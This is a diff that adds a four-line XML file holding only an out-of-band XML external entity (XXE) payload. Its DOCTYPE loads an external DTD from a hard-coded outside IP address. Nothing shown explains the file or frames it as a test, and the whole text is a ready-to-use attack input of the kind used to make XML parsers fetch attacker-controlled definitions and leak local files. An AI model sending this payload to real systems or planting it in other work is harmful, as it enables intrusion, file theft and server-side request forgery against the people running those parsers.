@@ -1,0 +1,4 @@
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://18.189.114.143:8000/external.xml">
+%remote;]>
+<root/>
